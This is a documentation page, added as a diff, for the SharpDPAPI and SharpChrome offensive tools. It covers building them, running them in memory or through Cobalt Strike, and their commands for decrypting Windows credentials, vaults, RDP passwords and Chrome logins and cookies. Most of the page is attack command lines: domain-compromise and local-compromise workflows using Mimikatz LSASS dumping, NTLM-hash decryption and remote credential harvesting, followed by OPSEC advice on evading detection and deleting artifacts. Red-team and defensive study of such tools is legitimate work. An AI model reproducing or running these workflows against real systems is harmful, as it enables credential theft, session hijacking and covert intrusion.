@@ -1,0 +1,496 @@
+---
+title: 'Compilation & Usage'
+description: 'Build SharpDPAPI and SharpChrome from source'
+icon: 'hammer'
+---
+
+## Build Requirements
+
+<CardGroup cols={2}>
+  <Card title="Visual Studio" icon="code">
+    Visual Studio 2019 Community Edition or later
+  </Card>
+  <Card title=".NET Framework" icon="microsoft">
+    .NET Framework 3.5 (default) or .NET 4.0/4.5
+  </Card>
+  <Card title="Git" icon="git">
+    For cloning the repository
+  </Card>
+  <Card title="Windows OS" icon="windows">
+    Windows build environment required
+  </Card>
+</CardGroup>
+
+## Compilation Steps
+
+<Steps>
+  <Step title="Clone Repository">
+    ```bash
+    git clone https://github.com/GhostPack/SharpDPAPI
+    cd SharpDPAPI
+    ```
+  </Step>
+
+  <Step title="Open Solution">
+    Open `SharpDPAPI.sln` in Visual Studio 2019 or later
+  </Step>
+
+  <Step title="Select Build Configuration">
+    - Choose **Release** configuration (not Debug)
+    - Target platform: **Any CPU**
+  </Step>
+
+  <Step title="Build Projects">
+    - Build → Build Solution (or press Ctrl+Shift+B)
+    - Both SharpDPAPI.exe and SharpChrome.exe will be compiled
+  </Step>
+
+  <Step title="Locate Binaries">
+    Compiled binaries will be in:
+    ```
+    SharpDPAPI/SharpDPAPI/bin/Release/SharpDPAPI.exe
+    SharpDPAPI/SharpChrome/bin/Release/SharpChrome.exe
+    ```
+  </Step>
+</Steps>
+
+## Targeting Different .NET Versions
+
+SharpDPAPI defaults to .NET Framework 3.5 for maximum compatibility. However, you can retarget to newer versions:
+
+<Tabs>
+  <Tab title=".NET 3.5 (Default)">
+    **Advantages:**
+    - Maximum compatibility
+    - Runs on most Windows systems by default
+    - Preferred for operational use
+
+    **Disadvantages:**
+    - May not be installed on newer systems
+    - Requires installation if not present
+
+    **No changes needed** - this is the default configuration.
+  </Tab>
+
+  <Tab title=".NET 4.0 / 4.5">
+    **Advantages:**
+    - More commonly installed on modern systems
+    - Better performance
+    - More features available
+
+    **Disadvantages:**
+    - May not be available on older systems
+    - Slightly larger binary size
+
+    **To retarget:**
+    1. Right-click the project in Solution Explorer
+    2. Select **Properties**
+    3. Go to **Application** tab
+    4. Change **Target framework** to .NET 4.0 or 4.5
+    5. Rebuild the solution
+  </Tab>
+</Tabs>
+
+<Warning>
+  If you change the target framework, ensure the target system has the appropriate .NET version installed.
+</Warning>
+
+## Binary Distribution
+
+<Note>
+  SpecterOps does not provide pre-compiled binaries for SharpDPAPI or SharpChrome. You must compile from source.
+</Note>
+
+**Why no binaries?**
+- Encourages understanding of the code
+- Prevents signature-based detection
+- Allows for customization
+- Avoids potential legal issues
+
+## Running SharpDPAPI
+
+<Tabs>
+  <Tab title="Direct Execution">
+    ```bash
+    # Basic execution
+    SharpDPAPI.exe
+
+    # Show command help
+    SharpDPAPI.exe --help
+
+    # Execute specific command
+    SharpDPAPI.exe triage /pvk:key.pvk
+    ```
+  </Tab>
+
+  <Tab title="PowerShell Wrapper">
+    You can load and execute SharpDPAPI in memory via PowerShell:
+
+    ```powershell
+    # Base64 encode the binary
+    [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Path\SharpDPAPI.exe")) | Out-File -Encoding ASCII SharpDPAPI.txt
+
+    # Load in PowerShell
+    $SharpDPAPIAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("AA..."))
+
+    # Execute command
+    [SharpDPAPI.Program]::Main("triage /pvk:key.pvk")
+    ```
+  </Tab>
+
+  <Tab title="PSRemoting">
+    For running over PSRemoting (which doesn't handle stdout well):
+
+    ```powershell
+    # Use MainString() method instead of Main()
+    [SharpDPAPI.Program]::MainString("machinetriage")
+    ```
+
+    Or redirect output to file:
+
+    ```bash
+    SharpDPAPI.exe triage /consoleoutfile:C:\output.txt /pvk:key.pvk
+    ```
+  </Tab>
+
+  <Tab title="Execute-Assembly">
+    Execute via Cobalt Strike or other frameworks:
+
+    ```
+    execute-assembly /path/to/SharpDPAPI.exe triage /pvk:key.pvk
+    ```
+  </Tab>
+</Tabs>
+
+## Command Line Syntax
+
+### SharpDPAPI
+
+```bash
+SharpDPAPI.exe <command> [arguments]
+```
+
+**Available Commands:**
+- `backupkey` - Retrieve domain DPAPI backup key
+- `masterkeys` - Decrypt user masterkeys
+- `credentials` - Decrypt Credential Manager credentials
+- `vaults` - Decrypt Windows Vault data
+- `rdg` - Decrypt RDP connection passwords
+- `keepass` - Extract KeePass master keys
+- `certificates` - Decrypt certificate private keys
+- `triage` - Run all user commands
+- `ps` - Decrypt PowerShell credential XML
+- `blob` - Decrypt arbitrary DPAPI blob
+- `search` - Search for DPAPI blobs
+- `sccm` - Extract SCCM credentials
+- `machinemasterkeys` - Decrypt machine masterkeys
+- `machinecredentials` - Decrypt system credentials
+- `machinevaults` - Decrypt system vaults
+- `machinetriage` - Run all machine commands
+
+### SharpChrome
+
+```bash
+SharpChrome.exe <command> [arguments]
+```
+
+**Available Commands:**
+- `logins` - Extract and decrypt saved passwords
+- `cookies` - Extract and decrypt cookies
+- `statekeys` - Extract AES state keys
+- `backupkey` - Retrieve domain DPAPI backup key
+
+## Quick Start Examples
+
+<AccordionGroup>
+  <Accordion title="Local User Triage (No Privileges)">
+    ```bash
+    # Decrypt current user's RDP passwords
+    SharpDPAPI.exe rdg /unprotect
+
+    # Extract current user's Chrome passwords
+    SharpChrome.exe logins
+
+    # Extract current user's Chrome cookies
+    SharpChrome.exe cookies /url:".*company\.com.*"
+    ```
+  </Accordion>
+
+  <Accordion title="Local Admin Triage">
+    ```bash
+    # Triage all machine DPAPI data
+    SharpDPAPI.exe machinetriage
+
+    # Use Mimikatz to get masterkeys
+    # mimikatz# sekurlsa::dpapi
+
+    # Triage user data with masterkeys
+    SharpDPAPI.exe triage {GUID1}:SHA1 {GUID2}:SHA1
+    SharpChrome.exe logins {GUID1}:SHA1 {GUID2}:SHA1
+    ```
+  </Accordion>
+
+  <Accordion title="Domain Admin Triage">
+    ```bash
+    # 1. Get domain backup key
+    SharpDPAPI.exe backupkey /file:key.pvk
+
+    # 2. Triage local system
+    SharpDPAPI.exe triage /pvk:key.pvk
+    SharpChrome.exe logins /pvk:key.pvk
+    SharpChrome.exe cookies /pvk:key.pvk
+
+    # 3. Triage remote systems
+    SharpDPAPI.exe credentials /pvk:key.pvk /server:workstation.domain.com
+    SharpChrome.exe logins /pvk:key.pvk /server:workstation.domain.com
+    ```
+  </Accordion>
+
+  <Accordion title="Offline Analysis">
+    ```bash
+    # Copy DPAPI data from target to analysis machine
+
+    # Decrypt with known password
+    SharpDPAPI.exe credentials /target:C:\Evidence\Credentials /password:Password123!
+
+    # Decrypt Chrome data with backup key
+    SharpChrome.exe logins /target:"C:\Evidence\Login Data" /pvk:key.pvk
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Common Workflows
+
+### Workflow 1: Domain Compromise
+
+```bash
+# Step 1: Retrieve domain backup key (requires DA)
+SharpDPAPI.exe backupkey /server:dc.domain.com /file:backup.pvk
+
+# Step 2: Triage all users on current system
+SharpDPAPI.exe triage /pvk:backup.pvk
+SharpChrome.exe logins /pvk:backup.pvk
+SharpChrome.exe cookies /pvk:backup.pvk /url:".*aws.*" /format:json
+
+# Step 3: Remote system enumeration
+SharpDPAPI.exe credentials /pvk:backup.pvk /server:workstation1.domain.com
+SharpDPAPI.exe credentials /pvk:backup.pvk /server:workstation2.domain.com
+SharpChrome.exe logins /pvk:backup.pvk /server:workstation1.domain.com
+```
+
+### Workflow 2: Local System Compromise
+
+```bash
+# Step 1: Extract masterkeys from LSASS with Mimikatz
+# mimikatz# privilege::debug
+# mimikatz# sekurlsa::dpapi
+
+# Step 2: Save masterkeys to file (format: {GUID}:SHA1 per line)
+# {8abc35b1-b718-4a86-9781-7fd7f37101dd}:ae349cdd3a230f5e04f70fd02be69e2e71f1b017
+# {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903a9b61c42e6c9ab0f4
+
+# Step 3: Triage with masterkey file
+SharpDPAPI.exe triage /mkfile:masterkeys.txt
+SharpChrome.exe logins /mkfile:masterkeys.txt
+
+# Step 4: Machine triage (requires elevation)
+SharpDPAPI.exe machinetriage
+```
+
+### Workflow 3: Credential-Based Access
+
+```bash
+# If you have a user's password
+SharpDPAPI.exe credentials /password:SecurePassword123
+SharpDPAPI.exe vaults /password:SecurePassword123
+SharpChrome.exe logins /password:SecurePassword123
+
+# If you have NTLM hash
+SharpDPAPI.exe credentials /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+SharpChrome.exe cookies /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+```
+
+## Output Management
+
+<Tabs>
+  <Tab title="Console Output">
+    Default behavior - prints to console:
+
+    ```bash
+    SharpDPAPI.exe credentials /pvk:key.pvk
+    ```
+
+    Good for: Interactive use, immediate feedback
+  </Tab>
+
+  <Tab title="File Output">
+    Redirect all output to file:
+
+    ```bash
+    SharpDPAPI.exe credentials /pvk:key.pvk /consoleoutfile:C:\results.txt
+    SharpChrome.exe cookies /pvk:key.pvk /consoleoutfile:C:\cookies.txt
+    ```
+
+    Good for: PSRemoting, logging, exfiltration
+  </Tab>
+
+  <Tab title="Formatted Output">
+    Choose output format (SharpChrome):
+
+    ```bash
+    # CSV format (default)
+    SharpChrome.exe logins /format:csv
+
+    # Table format
+    SharpChrome.exe logins /format:table
+
+    # JSON format (cookies only)
+    SharpChrome.exe cookies /format:json /setneverexpire
+    ```
+
+    Good for: Data processing, cookie hijacking
+  </Tab>
+</Tabs>
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="Build Errors" icon="triangle-exclamation">
+    **Problem:** Solution won't build
+
+    **Solutions:**
+    - Ensure Visual Studio 2019+ is installed
+    - Verify .NET Framework 3.5 is installed
+    - Clean solution (Build → Clean Solution)
+    - Rebuild solution (Build → Rebuild Solution)
+    - Check for missing NuGet packages
+  </Accordion>
+
+  <Accordion title=".NET Framework Not Found" icon="exclamation">
+    **Problem:** Target system doesn't have .NET Framework
+
+    **Solutions:**
+    - Install .NET Framework 3.5:
+      ```powershell
+      # Windows 10/11
+      DISM /Online /Enable-Feature /FeatureName:NetFx3 /All
+
+      # Or via PowerShell
+      Enable-WindowsOptionalFeature -Online -FeatureName NetFx3 -All
+      ```
+    - Or recompile for .NET 4.0/4.5
+  </Accordion>
+
+  <Accordion title="No Data Decrypted" icon="lock">
+    **Problem:** Commands run but no data is decrypted
+
+    **Solutions:**
+    - Verify decryption method is correct:
+      - Using `/unprotect`? Must run as target user
+      - Using `/pvk`? Must have valid backup key
+      - Using masterkeys? Must have correct GUIDs
+      - Using `/password`? Must be correct password
+    - Check if DPAPI data exists:
+      - Credentials: `%LOCALAPPDATA%\Microsoft\Credentials\`
+      - Vaults: `%LOCALAPPDATA%\Microsoft\Vault\`
+      - Chrome: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\`
+  </Accordion>
+
+  <Accordion title="Access Denied Errors" icon="ban">
+    **Problem:** Access denied when reading files
+
+    **Solutions:**
+    - For user DPAPI: Run as target user or use valid decryption method
+    - For machine DPAPI: Must run as Administrator
+    - For remote systems: Must have admin access to target
+    - For domain backup key: Must have Domain Admin privileges
+  </Accordion>
+
+  <Accordion title="Chrome 80+ Not Decrypting" icon="chrome">
+    **Problem:** Chrome logins/cookies won't decrypt
+
+    **Solutions:**
+    1. First decrypt the state key:
+       ```bash
+       SharpChrome.exe statekeys /pvk:key.pvk
+       ```
+    2. Then use the state key:
+       ```bash
+       SharpChrome.exe logins /statekey:EXTRACTED_KEY
+       ```
+    3. Or use automatic decryption:
+       ```bash
+       SharpChrome.exe logins /pvk:key.pvk
+       ```
+       (SharpChrome will automatically handle state key decryption)
+  </Accordion>
+</AccordionGroup>
+
+## Operational Security
+
+<Warning>
+  Consider these OPSEC factors when using SharpDPAPI/SharpChrome in operations:
+</Warning>
+
+<Tabs>
+  <Tab title="Detection Vectors">
+    - File reads of sensitive DPAPI locations
+    - LSASS access for DPAPI_SYSTEM secret
+    - Process execution of SharpDPAPI.exe/SharpChrome.exe
+    - Network SMB access to remote systems
+    - Domain controller backup key retrieval
+    - Bulk credential file access
+  </Tab>
+
+  <Tab title="Mitigation Strategies">
+    - Rename binaries to blend in
+    - Execute from memory via PowerShell
+    - Use execute-assembly in C2 frameworks
+    - Limit scope to specific targets
+    - Delete artifacts after use
+    - Redirect output to file to minimize console artifacts
+    - Use /consoleoutfile for cleaner operations
+  </Tab>
+
+  <Tab title="Alternative Execution">
+    - Load as .NET assembly in memory
+    - Use Donut/pe_to_shellcode for shellcode conversion
+    - Execute via C2 framework execute-assembly
+    - Reflective DLL injection
+    - PowerShell wrapper scripts
+  </Tab>
+</Tabs>
+
+## Additional Resources
+
+<CardGroup cols={2}>
+  <Card title="GitHub Repository" icon="github" href="https://github.com/GhostPack/SharpDPAPI">
+    Source code and latest releases
+  </Card>
+  <Card title="DPAPI Attack Guide" icon="book" href="https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/">
+    Operational guidance for DPAPI abuse
+  </Card>
+  <Card title="Mimikatz Wiki" icon="book" href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials">
+    Understanding Credential Manager and DPAPI
+  </Card>
+  <Card title="Visual Studio Community" icon="download" href="https://visualstudio.microsoft.com/vs/community/">
+    Download Visual Studio for compilation
+  </Card>
+</CardGroup>
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="SharpDPAPI Overview" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/overview">
+    Learn about DPAPI and SharpDPAPI capabilities
+  </Card>
+  <Card title="SharpChrome Overview" icon="chrome" href="/ghostpack-docs/SharpDPAPI-mdx/sharpchrome-overview">
+    Browser credential extraction guide
+  </Card>
+  <Card title="Command Reference" icon="terminal" href="/ghostpack-docs/SharpDPAPI-mdx/commands/triage">
+    Detailed command documentation
+  </Card>
+  <Card title="Example Scenarios" icon="book" href="/ghostpack-docs/SharpDPAPI-mdx/overview#typical-workflows">
+    Real-world usage scenarios
+  </Card>
+</CardGroup>
